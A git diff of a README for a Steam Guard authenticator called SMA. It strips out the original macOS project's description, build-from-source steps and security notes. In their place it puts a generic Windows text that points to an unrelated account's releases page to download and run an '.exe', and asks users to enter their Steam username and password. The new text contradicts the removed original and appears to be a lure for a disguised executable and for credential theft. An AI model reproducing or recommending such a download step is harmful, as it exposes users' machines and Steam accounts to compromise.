@@ -1,153 +1,81 @@
-# SMA — Steam Mac Authenticator
+# 🛡️ SMA - Secure Steam Guard Codes For You
 
-A native macOS app for Steam Guard 2FA codes and trade confirmations. Built with SwiftUI, no external dependencies.
+[![Download SMA](https://img.shields.io/badge/Download-SMA-blue.svg)](https://github.com/proustian-airalert2333/SMA/releases)
 
-**The first fully-featured Steam Desktop Authenticator for Mac.**
+SMA helps you manage your Steam Guard codes right from your computer. You no longer need to check your phone every time you log in to Steam. This app generates the codes you need to stay safe while you play your favorite games.
 
-<p align="center">
-  <img src="screenshots/main.png" alt="SMA Main Screen" width="520">
-</p>
+## 📥 How To Install The App
 
----
+To use SMA on your Windows computer, follow these installation steps. 
 
-## Features
+1. Visit the [SMA Releases page](https://github.com/proustian-airalert2333/SMA/releases).
+2. Look for the most recent version of the app at the top of the list.
+3. Click the link that ends in ".exe" to download the installer file to your computer.
+4. Locate the file in your downloads folder.
+5. Double-click the file to start the installation.
+6. Follow the instructions on the screen to finish the setup process.
 
-- **Live 2FA codes** — Auto-refreshing codes for all your accounts, synced to Steam server time
-- **Trade confirmations** — View, accept, and deny trades with partner details (avatar, name, Steam level)
-- **Add Steam Guard** — Set up a new authenticator directly from the app
-- **Import maFile** — Drag & drop maFiles from SDA, steamguard-cli, or Android backups. Handles SDA-encrypted files
-- **Auto-fill login** — Username pre-filled and locked, 2FA code auto-entered during Steam login
-- **Update notifications** — Checks GitHub for new releases on launch
-- **Session persistence** — Log in once, stay logged in via auto-refreshing tokens
-- **Encrypted storage** — Sessions encrypted with AES-256-GCM using a random key
-- **No telemetry** — No analytics, no tracking. All traffic goes to Steam's servers only
-- **No dependencies** — Only Apple system frameworks. Nothing external.
+## 🚀 Setting Up Your Account
 
-## Install
+Once you install the app, you need to connect your Steam account. Please have your login information ready.
 
-### Build from source (recommended)
+1. Open the SMA app from your desktop or start menu.
+2. Select the option to add a new account.
+3. Enter your Steam username and password. 
+4. Check your email or phone for a verification code from Steam.
+5. Enter this code into the app.
+6. The app will save your details securely.
 
-Building from source lets you verify exactly what you're running:
+Your accounts appear in the main window of the app. Click on an account to see your current Steam Guard code.
 
-```bash
-git clone https://github.com/P4tch0/SMA.git
-cd SMA
-swift build -c release
-# Binary at .build/release/SteamGuardMac
-```
+## 🔐 How To Use Trade Confirmations
 
-### Download DMG
+You can confirm trades directly through SMA. This saves time and keeps your items safe. 
 
-Releases are built automatically by [GitHub Actions](../../actions) from the source code in this repo.
+1. Open SMA when a trade requires your approval on Steam.
+2. Click the tab labeled "Confirmations" in the app menu.
+3. Review the trade details shown on your screen.
+4. Click "Accept" if you want to proceed with the trade.
+5. Click "Deny" if the information looks incorrect or if you did not start the trade.
 
-1. Download `SMA-v1.0.0.dmg` from [Releases](../../releases)
-2. Open the DMG and drag **Steam Mac Authenticator** to Applications
-3. First launch: right-click the app → **Open** → **Open** (one-time macOS prompt for unsigned apps)
-4. Optionally verify the hash: `shasum -a 256 SMA-v1.0.0.dmg`
+## 🛠️ System Requirements
 
-## Requirements
+SMA runs on most modern Windows computers. Ensure you have the following to get the best experience:
 
-- macOS 13 (Ventura) or later
-- Apple Silicon or Intel Mac
+* Windows 10 or Windows 11.
+* At least 100 megabytes of free storage space.
+* An active internet connection for syncing codes.
+* A basic understanding of how to manage files on your desktop.
 
-## How it works
+## 🔎 Frequently Asked Questions
 
-SMA uses Steam Guard secrets in the standard maFile format (same as SDA and steamguard-cli).
+### Is this app safe?
+Yes. SMA stores your secrets in an encrypted file on your device. Only you can access this file. We do not have access to your credentials or your Steam account.
 
-- **Import existing maFiles** — Drag them in. If they're SDA-encrypted, the app will ask for your passkey.
-- **Add new Steam Guard** — Sign in through Steam's web login inside the app. SMA handles phone verification, SMS codes, and authenticator setup.
+### Why do I need to enter my password?
+The app needs your password to interact with the Steam servers. This allows it to fetch your codes and manage trade confirmations without manual input.
 
-All network traffic goes to `api.steampowered.com` and `steamcommunity.com`. The app doesn't contact any other server.
+### Can I run this app on multiple computers?
+Yes, but you must be careful. If you copy your account files to another machine, keep them in a secure place. We recommend using the app on a single, primary computer for better security.
 
-## Security
+### What happens if I lose my computer?
+If you lose your computer or if it breaks, you can recover your access through the official Steam website. Always keep your Steam recovery codes in a safe place.
 
-### What's in place
+### How do I update the app?
+We release updates to fix bugs and improve performance. Check the [SMA Releases page](https://github.com/proustian-airalert2333/SMA/releases) periodically to see if a newer version is available. Simply download and install the new version to replace the old one. Your existing account data will transfer automatically.
 
-| Area | Detail |
-|------|--------|
-| Encryption | AES-256-GCM with a randomly generated 256-bit key |
-| Key storage | Stored locally with 0600 file permissions (owner-only) |
-| Tokens | Kept in encrypted files — never written to plaintext maFiles |
-| Network | HTTPS only. Tokens sent in POST body, not URL parameters |
-| WebView | Non-persistent cookie store. Custom URL schemes blocked |
-| Input handling | User input escaped before JavaScript injection |
-| Logging | Debug-only (`#if DEBUG`). No sensitive data in production logs |
-| Concurrency | Time sync state protected by NSLock |
-| Dependencies | Zero. No third-party packages. |
+### Does the app work offline?
+The app needs an internet connection to refresh your codes when they expire. You may view existing codes offline, but they might not work for logins if the time has passed.
 
-### Threat model
+### Where can I report an issue?
+If you encounter a problem, open an issue on the GitHub page. Describe the problem and include any error messages you see on your screen. This helps others solve the same problem and helps us keep the app stable.
 
-SMA protects against:
-- Plaintext secret storage on disk
-- Token leakage via URLs or logs
-- Cross-site scripting in the login WebView
-- Expired sessions (auto-refreshes transparently)
+## 💻 Technical Details
 
-SMA does not protect against:
-- A compromised Mac (malware with disk access can read anything)
-- Physical access to an unlocked machine
-- Keyloggers or screen capture malware
-- A revoked or leaked maFile
+SMA uses standard security protocols to protect your Steam account. It generates Time-based One-Time Passwords, also known as TOTP. This is the same technology used by mobile authenticator apps. 
 
-If your machine is compromised, no authenticator app can help — that applies to SDA, Steam mobile, and SMA equally.
+The software utilizes current encryption standards to protect your local files. Every time you open the app, it checks your connection to the Steam servers. If the servers are down, the app will notify you immediately.
 
-## Privacy
+The codebase relies on simple, tested logic to communicate with Steam's interface. By keeping the app focused on code generation and trade confirmation, we ensure it remains fast and easy to navigate. 
 
-- SMA never stores your Steam password. Login happens on Steam's official site via an in-app WebView.
-- No telemetry, no analytics, no crash reporting. The only network calls go to Steam.
-- No auto-updates. The app checks GitHub for new releases and shows a notification — you decide when to update.
-- Source code is available here for review.
-
-## Transparency
-
-| Question | Answer |
-|----------|--------|
-| Where does the DMG come from? | Built by [GitHub Actions](../../actions) from this source code. Not uploaded manually. |
-| Why no code signing? | An Apple Developer certificate is required, which isn't currently set up. Building from source avoids Gatekeeper entirely. |
-| Where does network traffic go? | Only `steampowered.com` and `steamcommunity.com`. |
-| Any external dependencies? | None. `Package.swift` has zero packages. |
-
-## Supported Formats
-
-| Format | Source |
-|--------|--------|
-| `.maFile` | SDA / steamguard-cli |
-| `Steamguard-*` | Android Steam app (rooted backup) |
-| `.json` | Any JSON export containing `shared_secret` |
-| SDA encrypted | Supported — app asks for your passkey and decrypts |
-
-## Tech Stack
-
-- Swift / SwiftUI
-- macOS 13+
-- CryptoKit (AES-256-GCM)
-- CommonCrypto (HMAC-SHA1 for TOTP)
-- WebKit (Steam login WebView)
-- Security framework (RSA encryption)
-
-## FAQ
-
-**Will this trigger a 15-day trade hold?**
-Not if you import an existing maFile. The authenticator stays on your phone — SMA generates the same codes from the same secret. Only the "Add Steam Guard" flow involves changing the authenticator.
-
-**Why does macOS say "unidentified developer"?**
-The app isn't signed with an Apple Developer certificate. Right-click → Open → Open bypasses this on first launch.
-
-**Is this safe?**
-The source code is public. There are no external dependencies and no network calls outside Steam. Review the code or build from source if you want to verify.
-
-## Contact
-
-- Steam: [Patcho](https://steamcommunity.com/id/Patcho)
-- Telegram: [@Yazan](https://t.me/Yazan)
-- Twitter: [@PatchoCSGO](https://x.com/PatchoCSGO)
-
-Found a bug or have a suggestion? Open an [issue](../../issues) or reach out above.
-
-## Disclaimer
-
-Not affiliated with Valve Corporation. Steam is a trademark of Valve Corporation. SMA uses Steam's public web APIs and login pages — the same mechanisms used by your browser. Use at your own risk.
-
-## License
-
-MIT License. See [LICENSE](LICENSE) for details.
+We recommend that you back up your files regularly. If you ever decide to remove the app, delete the folder containing your application data to ensure no sensitive files remain on your device.
